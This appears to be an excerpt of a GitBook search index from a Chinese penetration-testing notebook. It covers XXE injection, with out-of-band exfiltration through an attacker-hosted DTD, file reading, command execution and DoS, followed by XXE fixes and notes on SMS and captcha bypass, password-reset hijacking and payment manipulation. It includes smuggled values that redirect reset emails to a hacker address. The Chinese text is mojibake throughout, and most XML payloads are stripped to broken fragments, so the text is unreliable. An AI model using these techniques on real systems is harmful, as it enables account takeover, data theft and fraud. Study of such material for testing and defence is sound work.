DTDï¼ˆæ–‡æ¡£ç±»å‹å®šä¹‰ï¼‰çš„ä½œç”¨æ˜¯å®šä¹‰ XML æ–‡æ¡£çš„åˆæ³•æ„å»ºæ¨¡å—ã€‚DTD å¯ä»¥åœ¨ XML æ–‡æ¡£å†…å£°æ˜ï¼Œä¹Ÿå¯ä»¥å¤–éƒ¨å¼•ç”¨ã€‚ ]> ä¸Šé¢æ‰€ç¤ºçš„å°±æ˜¯ä¸€ä¸ªDTD ]> ä¸Šé¢æ‰€ç¤ºçš„å°±æ˜¯ä¸€ä¸ªå¤–éƒ¨DTD å®ä½“ DTDå®ä½“æ˜¯ç”¨äºå®šä¹‰å¼•ç”¨æ™®é€šæ–‡æœ¬æˆ–ç‰¹æ®Šå­—ç¬¦çš„å¿«æ·æ–¹å¼çš„å˜é‡ï¼Œå¯ä»¥å†…éƒ¨å£°æ˜æˆ–å¤–éƒ¨å¼•ç”¨ã€‚ ]> &hello æ–‡æ¡£å…ƒç´ å¯ä»¥ä½¿ç”¨&æ¥å¼•ç”¨å®ä½“çš„å€¼ï¼Œ&helloå°†è¢«æ›¿æ¢ä¸ºhello world å‚æ•°å®ä½“ XMLå‚æ•°å®ä½“æ˜¯ä¸€ç§ç‰¹æ®Šçš„XMLå®ä½“ï¼Œåªèƒ½åœ¨DTDä¸­çš„å…¶ä»–åœ°æ–¹å¼•ç”¨ \"> %b; ]> å¯ä»¥çœ‹åˆ°å‚æ•°å®ä½“ç”¨% nameå£°æ˜ï¼Œå¼•ç”¨æ—¶ç”¨%name; å¼•å…¥å¤–éƒ¨å®ä½“ ]> è¿™é‡Œä½¿ç”¨äº†fileåè®®æ¥å¼•å…¥å¤–éƒ¨å®ä½“ï¼Œå®é™…ä¸Šè¿˜èƒ½æ”¯æŒå¦‚ä¸‹åè®®ï¼Œè¿™ä¹Ÿæ˜¯xxeæ¼æ´å½¢æˆçš„åŸå›  XXEæ¼æ´ æ¦‚è¿° XXE æ¼æ´å…¨ç§° XML External Entity Injectionï¼Œå³ xml å¤–éƒ¨å®ä½“æ³¨å…¥æ¼æ´ æ¼æ´æˆå›  XXE æ¼æ´å‘ ç”Ÿåœ¨åº”ç”¨ç¨‹åºè§£æ XML è¾“å…¥æ—¶ï¼Œæ²¡æœ‰ç¦æ­¢å¤–éƒ¨å®ä½“çš„åŠ è½½ï¼Œè€Œå¤–éƒ¨å®ä½“çš„å¼•ç”¨å¯æ”¯æŒhttpï¼Œfileç­‰åè®®ï¼Œé€šè¿‡åˆ©ç”¨è¿™äº›åè®®è¿›è¡Œæ”»å‡»ã€‚ æ¼æ´åœºæ™¯ é»‘ç›’ content-typeæµ‹è¯• æ•°æ®åŒ…ä¸­çš„content-type application/xml text/xml http body æ•°æ®åŒ…è¯·æ±‚å¤´ä¸­Context-Typeçš„å€¼ä¸ºapplication/jsonï¼Œæ›´æ”¹ä¸ºapplication/xmlæˆ–è€…text/xmlï¼Œè§‚å¯Ÿå“åº”åŒ…æ˜¯å¦ä¼šè§£æxmlï¼Œæ¯”å¦‚è¿”å›çš„æŠ¥é”™ä¿¡æ¯ä¸­æ˜¾ç¤ºåç«¯æœ‰å¤„ç†xmlçš„ç»„ä»¶ï¼Œç„¶åæ’å…¥payloadæµ‹è¯• â€‹ xlsxï¼Œsvgç­‰æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½ç‚¹ åˆ©ç”¨EXCELè¿›è¡ŒXXEæ”»å‡» è§£å‹xlsxæ–‡ä»¶ï¼Œåœ¨[Content_Types].xmlä¸­æ’å…¥payload ç„¶åå†é‡æ–°æ‰“åŒ…ä¸º1.xlsx # ä¹Ÿå¯ä»¥å°è¯•åœ¨å¦‚ä¸‹xmlæ–‡ä»¶ä¸­æ’å…¥payload xl/workbook.xml xl/worksheets/sheet1.xml _rels/.rels xl/_rels/workbook.xml.rels xl/theme/theme1.xml _rels/.rels docProps/app.xml docProps/core.xml xl/_rels/workbook.xml.rels xl/styles.xml xl/workbook.xml ä¸Šä¼ svgï¼Œdocxç­‰xmlæ ¼å¼çš„æ–‡ä»¶è¿›è¡Œæ”»å‡» 1.svg ]> &file; java--jaråè®®è§£å‹å‹ç¼©åŒ… ç™½ç›’ç›¸å…³å‡½æ•° php simplexml_import_dom() éœ€è¦æ³¨æ„çš„æ˜¯PHPæ˜¯ä½¿ç”¨libxmlæ¥è§£æXMLçš„ï¼Œä½†æ˜¯libxml2.9.0å¼€å§‹å°±é»˜è®¤ä¸è§£æå¤–éƒ¨å®ä½“ï¼Œè‡ªç„¶å°±ä¸å­˜åœ¨xxeæ¼æ´ã€‚ java javax.xml.parsers.DocumentBuilder javax.xml.parsers.SAXParser javax.xml.parsers.SAXParserFactory javax.xml.transform.TransformerFactory javax.xml.validation.Validator javax.xml.validation.SchemaFactory javax.xml.transform.sax.SAXTransformerFactory javax.xml.transform.sax.SAXSource org.xml.sax.XMLReader org.xml.sax.helpers.XMLReaderFactory org.dom4j.io.SAXReader org.jdom.input.SAXBuilder org.jdom2.input.SAXBuilder javax.xml.bind.Unmarshaller javax.xml.xpath.XpathExpression javax.xml.stream.XMLStreamReader org.apache.commons.digester3.Digester æ¼æ´å±å®³ æ–‡ä»¶è¯»å– å†…ç½‘æ¢é’ˆ æ‹’ç»æœåŠ¡æ”»å‡» å‘½ä»¤æ‰§è¡Œ æ¼æ´åˆ©ç”¨ å®éªŒç¯å¢ƒ https://github.com/c0ny1/xxe-lab phpç‰ˆæœ¬ vulhub Apache solr XML å®ä½“æ³¨å…¥æ¼æ´ï¼ˆCVE-2017-12629ï¼‰ æœ‰å›æ˜¾ Demo libxml_disable_entity_loader(false); $xmlfile = file_get_contents('php://input'); try{ $dom = new DOMDocument(); $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); $creds = simplexml_import_dom($dom); $username = $creds->username; $password = $creds->password; if($username == $USERNAME && $password == $PASSWORD){ $result = sprintf(\"%d%s\",1,$username); }else{ $result = sprintf(\"%d%s\",0,$username); } }catch(Exception $e){ $result = sprintf(\"%d%s\",3,$e->getMessage()); } usernameä¸ºå›æ˜¾ä½ payload ]> &xxe; æ— å›æ˜¾ å¤–å¸¦ php://filterè¯»å–å¯¹æ–¹æœåŠ¡å™¨æ–‡ä»¶å†…å®¹â†’å¼•å…¥å¤–éƒ¨å®ä½“ï¼ˆæ”»å‡»æœåŠ¡å™¨ä¸Šçš„ï¼‰â†’è§¦å‘å¤–éƒ¨å®ä½“ä¸­çš„å†™å…¥ä»£ç ï¼Œå°†è¯»å–åˆ°çš„æ–‡ä»¶å†…å®¹èµ‹å€¼ç»™æŒ‡å®šå‚æ•°â†’æ¥æ”¶å‚æ•°ï¼Œåœ¨æ”»å‡»æœåŠ¡å™¨ç›‘å¬æˆ–è€…æŸ¥çœ‹æ—¥å¿—ï¼Œä»è€Œè·å–åˆ°å¯¹æ–¹æœåŠ¡å™¨æ–‡ä»¶å†…å®¹ %dtd; %send; ]> \" > %payload; æ³¨æ„ï¼štest.dtdçš„å†…å®¹ï¼Œå†…éƒ¨çš„%å·è¦è¿›è¡Œå®ä½“ç¼–ç æˆ&#x25ï¼ˆå› ä¸ºå®ä½“çš„å€¼ä¸­ä¸èƒ½æœ‰ %, æ‰€ä»¥å°†å…¶è½¬æˆhtmlå®ä½“ç¼–ç  %ï¼‰ åŸºäºæŠ¥é”™ æ„é€ ä¸€ä¸ªé”™è¯¯çš„urlå¹¶å°†æ³„éœ²æ–‡ä»¶å†…å®¹æ”¾åœ¨urlä¸­ï¼Œé€šè¿‡è¿™æ ·çš„æ–¹å¼è¿”å›æ•°æ®ã€‚ å¼•å…¥æœåŠ¡å™¨å®ä½“ %xxe; ]> xml.dtd \"> %eval; %error; å¼•å…¥æœ¬åœ°ç³»ç»Ÿæ–‡ä»¶--æµ‹è¯•å¤±è´¥ https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/ Your DTD code %local_dtd; ]> DTD code \"> &#x25;eval; &#x25;error; payload \"> &#x25;eval; &#x25;error; %local_dtd; ]> åµŒå¥—å‚æ•°å®ä½“ \"> &#x25;para2; '> %para; ]> ä¸æ˜¯æ‰€æœ‰çš„xmlè§£æå™¨éƒ½èƒ½è§£æåµŒå¥—å‚æ•°å®ä½“ åˆ©ç”¨æ–¹å¼ æ–‡ä»¶è¯»å– ]> ]> &rabbit; å½“ä¸èƒ½ä½¿ç”¨è¿‡æ»¤å™¨æ—¶ \"> %dtd; ]> evil.dtd POSTæ•°æ® &all; åˆ—ç›®å½•--JAVA ]> &xxe; ]> &xxe; å†…ç½‘æ¢æµ‹ ]> &rabbit; å‘½ä»¤æ‰§è¡Œ è¯¥ CASE æ˜¯åœ¨å®‰è£… expect æ‰©å±•çš„ PHP ç¯å¢ƒé‡Œæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ ]> &xxe; DOSæ”»å‡»--æ²¡æˆåŠŸè¿‡ ]> &lol9; æ­¤æµ‹è¯•å¯ä»¥åœ¨å†…å­˜ä¸­å°†å°å‹ XML æ–‡æ¡£æ‰©å±•åˆ°è¶…è¿‡ 3GB è€Œä½¿æœåŠ¡å™¨å´©æºƒã€‚ äº¦æˆ–è€…ï¼Œå¦‚æœç›®æ ‡æ˜¯UNIXç³»ç»Ÿï¼Œ ]> &xxe; å¦‚æœ XML è§£æå™¨å°è¯•ä½¿ç”¨/dev/randomæ–‡ä»¶ä¸­çš„å†…å®¹æ¥æ›¿ä»£å®ä½“ï¼Œåˆ™æ­¤ç¤ºä¾‹ä¼šä½¿æœåŠ¡å™¨ï¼ˆä½¿ç”¨ UNIX ç³»ç»Ÿï¼‰å´©æºƒã€‚ ç»•è¿‡ æ’å…¥ç©ºæ ¼ å¯ä»¥åœ¨æˆ–åæ’å…¥ä»»æ„æ•°é‡çš„ç©ºæ ¼ ç¼–ç ç»•è¿‡ UTF-7 UTF-16â€ŠBEï¼ŒUTF-16â€ŠLE UTF-32â€ŠBEã€UTF-32LEã€UTF-322143ã€UTF-323412 EBCDIC cat payload.xml | iconv -f utf-8 -t utf-7 > payload.7.xml å·¥å…· 7.XXEinjectorï¼šä¸€æ¬¾åŠŸèƒ½å¼ºå¤§çš„è‡ªåŠ¨åŒ–XXEæ³¨å°„å·¥å…· - bmjoker - åšå®¢å›­ (cnblogs.com) æ¼æ´ä¿®å¤ ç¦ç”¨å¤–éƒ¨å®ä½“ PHP: libxml_disable_entity_loader(true); JAVA: // SAXBuilder SAXBuilder builder = new SAXBuilder(); builder.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true); builder.setFeature(\"http://xml.org/sax/features/external-general-entities\", false); builder.setFeature(\"http://xml.org/sax/features/external-parameter-entities\", false); builder.setFeature(\"http://apache.org/xml/features/nonvalidating/load-external-dtd\", false); // DocumentBuilder DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance(); dbf.setExpandEntityReferences(false); DocumentBuilder documentBuilder = dbf.newDocumentBuilder(); // SAXReader SAXReader saxReader = new SAXReader(); saxReader.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true); saxReader.setFeature(\"http://xml.org/sax/features/external-general-entities\", false); saxReader.setFeature(\"http://xml.org/sax/features/external-parameter-entities\", false); saxReader.setFeature(\"http://apache.org/xml/features/nonvalidating/load-external-dtd\", false); // SAXTransformerFactory SAXTransformerFactory sf = (SAXTransformerFactory) SAXTransformerFactory.newInstance(); sf.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, \"\"); sf.setAttribute(XMLConstants.ACCESS_EXTERNAL_STYLESHEET, \"\"); // TransformerFactory TransformerFactory tf = TransformerFactory.newInstance(); tf.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, \"\"); tf.setAttribute(XMLConstants.ACCESS_EXTERNAL_STYLESHEET, \"\"); // Unmarshaller é»˜è®¤æ–¹æ³•ä¸å­˜åœ¨xxeæ¼æ´ Pythonï¼š from lxml import etreexmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False)) è¿‡æ»¤ç”¨æˆ·æäº¤çš„ XML æ•°æ® å¦‚è¿‡æ»¤å…³é”®è¯ï¼š å‚è€ƒæ–‡ç«  https://xz.aliyun.com/t/3357 https://r17a-17.github.io/2021/09/04/Java-XXE%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93 https://www.cnblogs.com/20175211lyz/p/11413335.html https://xz.aliyun.com/t/6829#toc-4 è¡¥å……ï¼šhttps://tttang.com/archive/1813/#toc__2 Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2024-12-28 15:45:43 "},"01.æ¸—é€æµ‹è¯•/02.Webå®‰å…¨/11.é€»è¾‘æ¼æ´/01.çŸ­ä¿¡éªŒè¯ç ä¸å›¾å½¢éªŒè¯ç .html":{"url":"01.æ¸—é€æµ‹è¯•/02.Webå®‰å…¨/11.é€»è¾‘æ¼æ´/01.çŸ­ä¿¡éªŒè¯ç ä¸å›¾å½¢éªŒè¯ç .html","title":"01.çŸ­ä¿¡éªŒè¯ç ä¸å›¾å½¢éªŒè¯ç ","keywords":"","body":"ä¸€èˆ¬æ ¡éªŒè¿‡ç¨‹ çŸ­ä¿¡éªŒè¯ç  çŸ­ä¿¡è½°ç‚¸ ç»•è¿‡æ–¹æ³• # æ‰‹æœºå· æ·»åŠ åŒºå·å¦‚+86 æ‰‹æœºå·å‰åæ·»åŠ ç©ºæ ¼ å¤šæ‰‹æœºå·å‚æ•°ï¼šmobile=xx&mobile=xx æ·»åŠ é€—å·ï¼šmobile=xxx,xxx æ‰‹æœºå·é•¿åº¦ Fuzzï¼ˆä½ç½®æ‰‹æœºå·å‰ï¼Œåï¼Œå‰åï¼‰ # ä¸åŒæ¥å£ typeå‚æ•° # çªç ´éªŒè¯ç å‘é€æ¬¡æ•°é™åˆ¶ ä¿®æ”¹è¯·æ±‚åŒ…UA,IP æ—¶é—´æˆ³ç»•è¿‡ï¼šæ•°æ®åŒ…è¿”å›timeå‚æ•°ï¼Œåç«¯é€šè¿‡æ ¡éªŒæ—¶é—´æˆ³æ¥åˆ¤æ–­æ˜¯å¦èƒ½å†æ¬¡å‘é€çŸ­ä¿¡ # éªŒè¯ç çŸ­ä¿¡å†…å®¹å¯æ§ Trubo Intruderçš„%så›æ˜¾ éªŒè¯ç ç”±å®¢æˆ·ç«¯å‘é€ çŸ­ä¿¡éªŒè¯ç æ ¡éªŒç»•è¿‡ # éªŒè¯ç å¯æš´åŠ›ç ´è§£ é€šå¸¸çŸ­ä¿¡éªŒè¯ç æœ‰æ•ˆæœŸä¸º1minï¼Œåªèƒ½çˆ†4ä½çš„ï¼Œå¯ä»¥çœ‹çœ‹å‘é€çš„éªŒè¯ç é•¿åº¦æ˜¯å¦å¯æ§å‚æ•°æœ‰ä¸¤ä¸ªæ¯”å¦‚mobile=xxx&code=6ï¼Œè¿™ä¸ªcode=6ä»£è¡¨éªŒè¯ç é•¿åº¦ çŸ­ä¿¡éªŒè¯ç å­˜åœ¨é»˜è®¤å€¼ï¼šæ‰€æœ‰æ‰‹æœºå·å‡å­˜åœ¨é»˜è®¤çŸ­ä¿¡éªŒè¯ç ï¼ˆæ²¡ç¢°åˆ°è¿‡ï¼‰æˆ–è€…åªæœ‰æµ‹è¯•æ‰‹æœºå·å­˜åœ¨é»˜è®¤çŸ­ä¿¡éªŒè¯ç ï¼ˆç¢°åˆ°è¿‡ï¼‰ # éªŒè¯ç å¯è·å¾— æœåŠ¡ç«¯å›æ˜¾:å“åº”åŒ…ä¸­å›æ˜¾çŸ­ä¿¡éªŒè¯ç  çŸ­ä¿¡æ¥æ”¶æ–¹å¯ç¯¡æ”¹ï¼šå¯ä¿®æ”¹è¯·æ±‚åŒ…ä¸­çš„æ‰‹æœºå·æ§åˆ¶éªŒè¯ç çš„å‘é€ ä¿®æ”¹æ‰‹æœºå·å‘ç»™æ”»å‡»è€… å‘é€ç»™å¤šä¸ªæ‰‹æœºå·å¹¶ä¸”æ”¶åˆ°çš„éªŒè¯ç æ˜¯ç›¸åŒçš„æ¯”å¦‚phone=phone1,phone2 # ç»‘å®šå…³ç³»å¤±æ•ˆ éªŒè¯ç æœªä¸æ‰‹æœºå·è¿›è¡Œç»‘å®š çŸ­ä¿¡æ¥æ”¶æ–¹å¯ç¯¡æ”¹ï¼šç”¨phone2æ¥å—çš„éªŒè¯ç æ ¡éªŒphone1 æœ€ç»ˆæäº¤æ—¶å­˜åœ¨ä¸¤ä¸ªæ‰‹æœºå·å‚æ•°ï¼šä¸€ä¸ªç”¨äºéªŒè¯çŸ­ä¿¡éªŒè¯ç ï¼Œä¸€ä¸ªç”¨äºæ³¨å†Œ/ç™»å½•ï¼Œåç«¯æ²¡æœ‰å¯¹è¿™ä¸¤ä¸ªå‚æ•°åšä¸€è‡´æ€§æ ¡éªŒï¼Œè¾¾åˆ°çš„æ•ˆæœå°±æ˜¯ç”¨è‡ªå·±çš„æ‰‹æœºå·æ¥å—éªŒè¯ç æ¥æ³¨å†Œä»–äººçš„æ‰‹æœºå· # éªŒè¯ç éªŒè¯æœºåˆ¶å¤±æ•ˆ ä¸‡èƒ½éªŒè¯ç ï¼šå°†éªŒè¯ç ç½®ç©ºï¼Œåˆ é™¤ï¼Œç½®nullæ—¶åç«¯ä¸å¯¹éªŒè¯ç è¿›è¡Œæ ¡éªŒ éªŒè¯ç å¯å¤ç”¨ï¼šéªŒè¯ç çš„æœ‰æ•ˆæœŸè¿‡é•¿ï¼Œå¹¶ä¸”åœ¨ä½¿ç”¨åä»å¯ä»¥å†æ¬¡ä½¿ç”¨æˆ–è€…åœ¨ä¸€å®šæ—¶é—´å†…å‘é€çš„çŸ­ä¿¡éƒ½æ˜¯ç›¸åŒçš„ ï¼ˆä¿®å¤å»ºè®®ï¼šå½“æœåŠ¡å™¨ç«¯å¤„ç†å®Œä¸€æ¬¡ç”¨æˆ·æäº¤çš„è¯·æ±‚ä¹‹å,åŠæ—¶å°† sessionåŸŸä¸­çš„éªŒè¯ç æ¸…é™¤,å¹¶ç”Ÿæˆæ–°çš„éªŒè¯ç ã€‚ï¼‰ å›¾å½¢éªŒè¯ç  ç›˜ç‚¹å›¾å½¢éªŒè¯ç çš„æ¼æ´æŒ–æ˜æ–¹å¼ï¼Œçœ‹å®Œä¹‹åä½ è¿˜ä¸ä¼šæŒ–å—ï¼Ÿ å›¾å½¢éªŒè¯ç è¯†åˆ« captcha-killer-modified/FAQ.md at main Â· f0ng/captcha-killer-modified ã€Securityã€‘åˆ©ç”¨Burp Suiteçˆ†ç ´å¸¦æœ‰éªŒè¯ç Webç™»å½•æ¥å£ï¼ˆä¿å§†çº§æ•™ç¨‹ï¼‰ - ä¸ºæå®¢è€Œç”Ÿ - åšå®¢å›­ regexï¼š\"token\":\"(.*?)\" [*] use @captcha@ replace captcha [*] use @captcha-killer-modified@ replace captcha's token å›¾å½¢éªŒè¯ç å¤ç”¨ å›¾å½¢éªŒè¯ç æœ‰æ•ˆæ—¶é—´è¿‡é•¿ï¼ˆç¢°åˆ°è¿‡ä¸€ä¸ªéªŒè¯ç ä¿¡æ¯å­˜å‚¨åœ¨JWTçš„é‡Œçš„ï¼Œé€šè¿‡ä¿®æ”¹EXPä»è€ŒéªŒè¯ç å¤ç”¨ï¼‰ æ²¡æœ‰é‡ç½®å›¾å½¢éªŒè¯ç  åç«¯å®é™…ä¸æ ¡éªŒéªŒè¯ç  å›¾å½¢éªŒè¯ç Dosæ”»å‡» é€šè¿‡æ§åˆ¶å›¾å½¢éªŒè¯ç çš„å¤§å° æ»‘å—éªŒè¯ç  https://www.freebuf.com/articles/web/238038.html çœ‹æˆ‘å¦‚ä½•ç»•è¿‡æ»‘å—éªŒè¯ç æ‹¿åˆ°é«˜å±æ¼æ´ - å…ˆçŸ¥ç¤¾åŒº (aliyun.com) Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2024-12-25 22:02:34 "},"01.æ¸—é€æµ‹è¯•/02.Webå®‰å…¨/11.é€»è¾‘æ¼æ´/02.ä»»æ„ç”¨æˆ·å¯†ç é‡ç½®.html":{"url":"01.æ¸—é€æµ‹è¯•/02.Webå®‰å…¨/11.é€»è¾‘æ¼æ´/02.ä»»æ„ç”¨æˆ·å¯†ç é‡ç½®.html","title":"02.ä»»æ„ç”¨æˆ·å¯†ç é‡ç½®","keywords":"","body":"ä¸€èˆ¬é‡ç½®å¯†ç æµç¨‹ è¾“å…¥ä¸è´¦æˆ·å…³è”çš„é‚®ç®±åœ°å€æˆ–ç”¨æˆ·å é€šè¿‡ä»¥ä¸‹æ–¹å¼éªŒè¯èº«ä»½ï¼š é‚®ç®±éªŒè¯ï¼šæ¥æ”¶åŒ…å«é‡ç½®é“¾æ¥çš„é‚®ä»¶ã€‚ çŸ­ä¿¡éªŒè¯ï¼šè·å–åŒ…å«éªŒè¯ç çš„çŸ­ä¿¡ã€‚ å®‰å…¨é—®é¢˜ï¼šå›ç­”é¢„è®¾çš„å®‰å…¨é—®é¢˜ã€‚ é‡ç½®å¯†ç  ç‚¹å‡»é‚®ä»¶æˆ–çŸ­ä¿¡ä¸­çš„é“¾æ¥ï¼Œæˆ–è¾“å…¥éªŒè¯ç åï¼Œè¿›å…¥å¯†ç é‡ç½®é¡µé¢ã€‚ è¾“å…¥æ–°å¯†ç å¹¶ç¡®è®¤ã€‚ å®Œæˆé‡ç½® ç³»ç»Ÿæç¤ºå¯†ç é‡ç½®æˆåŠŸï¼Œä½¿ç”¨æ–°å¯†ç ç™»å½• å¸¸è§åœºæ™¯ å¯èƒ½å‡ºç°åœ¨æ–°ç”¨æˆ·æ³¨å†Œé¡µé¢ï¼Œä¹Ÿå¯èƒ½æ˜¯ç”¨æˆ·ç™»å½•åé‡ç½®å¯†ç çš„é¡µé¢ï¼Œæˆ–è€…ç”¨æˆ·å¿˜è®°å¯†ç æ—¶çš„å¯†ç æ‰¾å›é¡µé¢ã€‚å…¶ä¸­ï¼Œå¯†ç æ‰¾å›åŠŸèƒ½æ˜¯é‡ç¾åŒºã€‚ åœ¨ç¬¬äºŒæ­¥éªŒè¯èº«ä»½æ—¶ é‡ç½®å‡­è¯æ³„æ¼ å“åº”åŒ…ä¸­è¿”å›çŸ­ä¿¡éªŒè¯ç  é‚®ä»¶é‡ç½®é“¾æ¥æ³„éœ² é‡ç½®å‡­è¯æ¥æ”¶æ–¹å¯åŠ«æŒ aã€æ„é€ ä¸¤ä¸ªå‚æ•°ï¼š email=victim@xyz.tld&email=hacker@xyz.tld bã€ä½¿ç”¨æŠ„é€æ–¹å¼: email=victim@xyz.tld%0a%0dcc:hacker@xyz.tld cã€ä½¿ç”¨åˆ†éš”ç¬¦ï¼š email=victim@xyz.tld,hacker@xyz.tld email=victim@xyz.tld%20hacker@xyz.tld email=victim@xyz.tld|hacker@xyz.tld å¯ä¿®æ”¹è¯·æ±‚åŒ…ä¸­çš„æ‰‹æœºå·æ§åˆ¶çŸ­ä¿¡éªŒè¯ç å‘é€åˆ°å“ª phone=phone2ï¼›phone=phone1ï¼Œphone2 å¯ä¿®æ”¹è¯·æ±‚åŒ…ä¸­çš„é‚®ç®± PHPä¿®æ”¹user[email]=admin@gmail.comä¸ºuser[email][]=admin@gmail.com&user[email][]=evil@gmail.com aã€æ„é€ ä¸¤ä¸ªå‚æ•°ï¼š email=victim@xyz.tld&email=hacker@xyz.tld bã€ä½¿ç”¨æŠ„é€æ–¹å¼: email=victim@xyz.tld%0a%0dcc:hacker@xyz.tld cã€ä½¿ç”¨åˆ†éš”ç¬¦ï¼š email=victim@xyz.tld,hacker@xyz.tld email=victim@xyz.tld%20hacker@xyz.tld email=victim@xyz.tld|hacker@xyz.tld éªŒè¯ç å¯æš´åŠ›ç ´è§£ æœåŠ¡ç«¯å®é™…æœªæ ¡éªŒ é‡ç½®é“¾æ¥ä¸­çš„tokenæ ¼å¼ç¬¦åˆå³å¯ï¼Œå†…å®¹éšä¾¿å¡« çŸ­ä¿¡éªŒè¯ç ç½®ç©ºï¼Œç½®nullï¼Œä¸‡èƒ½éªŒè¯ç  å¯æšä¸¾æ— å¯†ä¿çš„ç”¨æˆ·åï¼Œå¯¼è‡´ä»»æ„å¯†ä¿ç­”æ¡ˆå‡å¯é‡ç½®å¯†ç  ä¾é å‰ç«¯ js åˆ¤æ–­æ˜¯å¦å¯ä»¥è¿›å…¥ç¬¬ä¸‰æ­¥ ç¬¬äºŒæ­¥æ ¡éªŒé€šè¿‡æ—¶æœåŠ¡ç«¯å¹¶æœªå‘å®¢æˆ·ç«¯ set-cookieï¼Œè€Œæ˜¯é€šè¿‡å‰ç«¯ js åˆ¤æ–­ï¼Œåªéœ€å°†å“åº”å†…å®¹æ›¿æ¢æˆé€šè¿‡æ ¡éªŒçš„å³å¯ åœ¨ç¬¬ä¸‰æ­¥é‡ç½®å¯†ç æ—¶ ç»‘å®šå…³ç³»å¤±æ•ˆ é‡ç½®å¯†ç æ—¶é€šè¿‡sessionidç»‘å®šè´¦å·ï¼Œåˆ©ç”¨ï¼Ÿ é‡ç½®å¯†ç é€šè¿‡è¯·æ±‚åŒ…ä¸­çš„ç”¨æˆ·åå‚æ•°è¿›è¡Œç»‘å®š Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2024-12-25 22:18:07 "},"01.æ¸—é€æµ‹è¯•/02.Webå®‰å…¨/11.é€»è¾‘æ¼æ´/03.æ”¯ä»˜æ¼æ´.html":{"url":"01.æ¸—é€æµ‹è¯•/02.Webå®‰å…¨/11.é€»è¾‘æ¼æ´/03.æ”¯ä»˜æ¼æ´.html","title":"03.æ”¯ä»˜æ¼æ´","keywords":"","body":" æ”¯ä»˜æµç¨‹ é€‰æ‹©å•†å“å’Œæ•°é‡-é€‰æ‹©æ”¯ä»˜åŠé…é€æ–¹å¼-ç”Ÿæˆè®¢å•ç¼–å·-è®¢å•æ”¯ä»˜é€‰æ‹©ï¼ˆæ˜¯å¦æ”¯ä»˜ï¼‰-å®Œæˆæ”¯ä»˜ å•†å“ä»·æ ¼ æ•´å‹æº¢å‡º è¶…å‡ºæœ€å¤§å€¼åé‡æ–°å¼€å§‹è®¡æ•° è´Ÿæ•° æ­£å¸¸çš„é€»è¾‘æ˜¯ç”¨æˆ·è´­ä¹°å•†å“ï¼Œç„¶åä»·æ ¼ç´¯åŠ å¾—åˆ°ä¸€ä¸ªæ€»ä»·è¿›è¡Œæ‰£æ¬¾ã€‚è¿™ä¸ªæ—¶å€™å°±ä¼šäº§ç”Ÿé€»è¾‘é—®é¢˜ï¼šå¦‚æœè¯´ç”¨æˆ·è´­ä¹°çš„å•†å“ä»·æ ¼æ˜¯è´Ÿæ•°äº†ï¼Œé‚£ä¹ˆè®¡ç®—çš„æ€»æ•°å°±æ˜¯è´Ÿæ•°ã€‚åè¿‡æ¥é’±ç»™ç”¨æˆ· å››èˆäº”å…¥ ä»¥å……å€¼ä¸ºä¾‹ï¼Œä½™é¢å€¼ä¸€èˆ¬ä¿å­˜åˆ°åˆ†ä¸ºæ­¢ï¼Œé‚£ä¹ˆå¦‚æœæˆ‘å……å€¼ 0.001å…ƒä¹Ÿå°±æ˜¯1å˜ï¼Œä¸€èˆ¬å¼€å‘ä¼šåœ¨å‰ç«¯åˆ¤æ–­æˆ‘ä»¬çš„æ•°å­—ï¼Œæˆ–è€…å°†æœ€åä¸€ä½å››èˆ äº”å…¥ï¼Œä½¿ç”¨æ”¯ä»˜å®å……å€¼æ˜¯ç›´æ¥æŠ¥é”™çš„ï¼Œå› ä¸ºç¬¬ä¸‰æ–¹ä¸€èˆ¬åªæ”¯æŒåˆ°åˆ†ã€‚ é‚£æˆ‘ä»¬å¦‚æœå……å€¼0.019å‘¢ï¼Œç”±äºæ”¯ä»˜å®åªåˆ¤æ–­åˆ°åˆ†ï¼Œæ‰€ä»¥å¯¼è‡´åªèƒ½æ”¯ä»˜0.01ï¼Œ è€Œç”±äºæˆ‘ä»¬æ”¯ä»˜æˆåŠŸï¼Œå‰ç«¯ä¼šå°†9å››èˆäº”å…¥ï¼Œç›´æ¥å˜æˆ0.02ï¼Œæ‰€ä»¥ç­‰äºç›´æ¥åŠä»· å……å€¼ã€‚ï¼ˆè¿™ä¸ªæ¼æ´äº¬ä¸œä¹Ÿæ˜¯æœ‰çš„ï¼Œä¸è¿‡åæ¥ä¿®å¤äº†ã€‚ è¥é”€æŠ˜æ‰£ ç§¯åˆ†å…‘æ¢åœºæ™¯ ç§¯åˆ†æŠµé’±æ˜¯å¦‚ä½•æ¢ç®—çš„ï¼Ÿ # å‡è®¾1æ¯”2æ¢ç®—ï¼Œ1ç§¯åˆ†ç®—2å…ƒ 100 - ç§¯åˆ† = 100 - ç§¯åˆ† 100 - -ç§¯åˆ† = 100 + ç§¯åˆ† 100 - ç§¯åˆ†*10 = (100 - ç§¯åˆ†) *10 100 - (2*ç§¯åˆ†) = 100 - (2*ç§¯åˆ†) 100 - (2* (ç§¯åˆ†-ç§¯åˆ†-1) ) = 100 + 2 ä¼˜æƒ åˆ¸åœºæ™¯ å¹¶å‘é¢†å– ç›—ç”¨ ç ”ç©¶ä¼˜æƒ å·çš„ç¼–å·è§„å¾‹ï¼Œä½¿ç”¨æ²¡é¢†çš„ æ°´å¹³è¶Šæƒï¼Œç›—ç”¨åˆ«äººçš„ é‡å¤ä½¿ç”¨ ä½¿ç”¨ä¼˜æƒ å·çš„æ•°æ®åŒ…è¿›è¡Œå¹¶å‘ï¼Œåˆ›å»ºå¤šä¸ªä½¿ç”¨äº†ä¼˜æƒ åˆ¸çš„è®¢å• 